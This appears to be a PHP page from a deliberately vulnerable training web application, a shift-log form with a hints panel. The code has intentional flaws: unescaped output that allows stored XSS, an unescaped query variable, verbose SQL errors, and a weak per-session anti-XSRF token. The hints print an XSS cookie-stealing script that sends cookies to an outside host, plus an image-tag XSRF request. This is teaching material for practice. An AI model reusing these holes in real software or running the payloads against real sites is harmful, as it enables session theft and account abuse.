<center><h2><b>Shift Log Entry</b></h2></center><p>

<form method="POST" action="" .$_SERVER['SCRIPT_NAME'] . "?" . $_SERVER['QUERY_STRING']>
        <p>Please submit your shift log entry.</p>
        <!--<p><input type="text" name="user_name" size="20"></p> -->
        <p><textarea rows="10" cols="50" name="input" size="20"></textarea></p>
        <input type="hidden" name="xsrf_token" value="<?php echo generateToken('protectedForm'); ?>"/>
        <p><input type="submit" value="Submit"></p>
</form>

<?php

function generateToken( $formName )
{
    if ( !session_id() ) {
        session_start();
    }
    $sessionId = session_id();
    return sha1( $formName.$sessionId );

}

function checkToken( $token, $formName )
{
    return $token === generateToken( $formName );
}

if ( !empty( @$_POST['xsrf_token'] ) ) {
    if( checkToken( @$_POST['xsrf_token'], 'protectedForm' ) ) {
// Grab inputs
        $inputfromform = $mysqli->real_escape_string(@$_REQUEST["input"]);
        $showonlyuser =  @$_REQUEST["show_only_user"];
        if ($inputfromform  <> "") {
                $query = "INSERT INTO blogs_table(blogger_name, comment, date) VALUES ('".
                        $logged_in_user . "', '".
                        $inputfromform  . "', " .
                        " now() )";

                        $result = $mysqli->query($query);
        }

        $query  = "SELECT * FROM blogs_table WHERE
                blogger_name like '{$logged_in_user}%'
               ORDER BY date DESC
                LIMIT 0 , 100";

        $result = $mysqli->query($query) or die($mysqli->error . '<p><b>SQL Statement:</b>' . $query);;
        //echo $result;

        echo 'Entries:<p>';
        while($row = $result->fetch_assoc())
        {
                echo "<p><b>{$row['blogger_name']}:</b>({$row['date']})<br>{$row['comment']}</p>";
        }
        echo "<p>";
        echo "anti-XSRF token OK" , "<br> <br>";

    }
        else {
                echo "<BR> <BR>", "ANTI - XSRF TOKEN TAMPERED WITH!", "<BR> <BR>";
        }
}

// Begin hints section
if (@$_COOKIE["showhints"]==1) {
	echo '<p><div style="background-color: #FFFF00"></p> <p><center><h2><b>HINT - Disable with link on the left</b></h2></center></p>
        <b>For XSS:</b>XSS is easy stuff. This one shows off both reflected (you see the results 
        instantly) and stored (someone can run across it later in another app that
        uses the same database). "&lt;script&gt;alert("XSS");&lt;/script&gt;" is the classic, but 
        there are far more interesting things you could do which I plan show in a video later. 
        For some hot cookie stealing action, try something like:</p>
        <pre>
        &lt;script&gt;
                new Image().src="http://some-ip/mutillidae/catch.php?cookie="+encodeURI(document.cookie);
        &lt;/script&gt;
        </pre>  
        <p><span style="background-color: #FFFF00">
        Also, check out <a href="http://ha.ckers.org/xss.html">Rsnake\'s XSS Cheat Sheet</a>
        for more ways you can encode XSS attacks that may allow you to get around some filters.
        <br><br>
        <b>For XSRF:</b>Ok, what you have do is create another page someplace and
        make a link to an image that is not an image. You could use something like 
        the following:
        <br>
        &lt;img src="http://dojo-basic/index.php?page=enter-shift-log.php&input=hi%20there%20monkeyboy"&gt;
        <br>
        This is the easy way to do XSRF with the GET method. Just login as someone, make 
        your page with the link image someplace else, and then view it. You should now see
        something new on the comment wall. :)
        <br>
        <b>WATCH OUT for the new anti-XSRF token!!!!</b>
        </div></p>';
}
?>

